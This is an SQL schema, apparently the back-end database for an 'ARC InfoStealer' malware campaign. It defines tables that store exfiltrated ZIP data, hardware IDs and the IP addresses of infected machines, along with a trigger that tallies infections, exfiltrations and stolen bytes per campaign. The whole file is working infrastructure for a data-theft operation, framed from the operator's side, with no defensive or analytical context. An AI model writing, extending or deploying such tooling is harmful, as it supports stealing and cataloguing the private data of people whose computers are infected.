-- Basic schema for ARC InfoStealer
-- Drop existing tables to start fresh
DROP TABLE IF EXISTS infostealer_data CASCADE;

-- Main table for storing infostealer exfiltration data
CREATE TABLE infostealer_data (
    id SERIAL PRIMARY KEY,
    hwid VARCHAR(255) NOT NULL,                    -- Hardware ID from GetCurrentHwProfileA
    pid INTEGER NOT NULL,                          -- Petition ID (exfiltration phase: 1, 2, 3, etc.)
    aid VARCHAR(255) NOT NULL,                     -- ARC ID (campaign/build identifier)
    client_ip INET NOT NULL,                       -- IP address of the infected system
    zip_size BIGINT NOT NULL,                      -- Size of the uploaded ZIP file
    file_count INTEGER NOT NULL,                   -- Number of files in the ZIP
    extracted_size BIGINT NOT NULL,                -- Total size of extracted data
    data JSONB NOT NULL,                           -- Extracted and parsed data from ZIP
    created_at TIMESTAMPTZ NOT NULL DEFAULT NOW(),
    
    -- Indexes for performance
    CONSTRAINT idx_infostealer_data_hwid_pid UNIQUE (hwid, pid, aid)
);

-- Indexes for efficient querying
CREATE INDEX IF NOT EXISTS idx_infostealer_data_hwid ON infostealer_data (hwid);
CREATE INDEX IF NOT EXISTS idx_infostealer_data_aid ON infostealer_data (aid);
CREATE INDEX IF NOT EXISTS idx_infostealer_data_created_at ON infostealer_data (created_at DESC);
CREATE INDEX IF NOT EXISTS idx_infostealer_data_client_ip ON infostealer_data (client_ip);

-- GIN index for JSONB data queries
CREATE INDEX IF NOT EXISTS idx_infostealer_data_jsonb ON infostealer_data USING GIN (data);

-- Statistics table for tracking campaigns
CREATE TABLE IF NOT EXISTS campaign_stats (
    aid VARCHAR(255) PRIMARY KEY,                  -- ARC ID (campaign identifier)
    total_infections INTEGER DEFAULT 0,           -- Total unique HWIDs
    total_exfiltrations INTEGER DEFAULT 0,        -- Total exfiltration attempts
    first_seen TIMESTAMPTZ,                       -- First exfiltration timestamp
    last_seen TIMESTAMPTZ,                        -- Last exfiltration timestamp
    total_data_size BIGINT DEFAULT 0,             -- Total data collected in bytes
    created_at TIMESTAMPTZ NOT NULL DEFAULT NOW(),
    updated_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
);

-- Function to update campaign statistics
CREATE OR REPLACE FUNCTION update_campaign_stats()
RETURNS TRIGGER AS $$
BEGIN
    INSERT INTO campaign_stats (aid, total_infections, total_exfiltrations, first_seen, last_seen, total_data_size, updated_at)
    VALUES (
        NEW.aid,
        1,
        1,
        NEW.created_at,
        NEW.created_at,
        NEW.zip_size,
        NOW()
    )
    ON CONFLICT (aid) DO UPDATE SET
        total_infections = (
            SELECT COUNT(DISTINCT hwid) 
            FROM infostealer_data 
            WHERE aid = NEW.aid
        ),
        total_exfiltrations = campaign_stats.total_exfiltrations + 1,
        last_seen = NEW.created_at,
        total_data_size = campaign_stats.total_data_size + NEW.zip_size,
        updated_at = NOW();
    
    RETURN NEW;
END;
$$ LANGUAGE plpgsql;

-- Trigger to automatically update campaign statistics
CREATE TRIGGER trigger_update_campaign_stats
    AFTER INSERT ON infostealer_data
    FOR EACH ROW
    EXECUTE FUNCTION update_campaign_stats();

-- Create database user (run as superuser)
-- CREATE USER arc_user WITH PASSWORD 'arc_password';
-- GRANT ALL PRIVILEGES ON DATABASE arc_infostealer TO arc_user;
-- GRANT ALL PRIVILEGES ON ALL TABLES IN SCHEMA public TO arc_user;
-- GRANT ALL PRIVILEGES ON ALL SEQUENCES IN SCHEMA public TO arc_user;
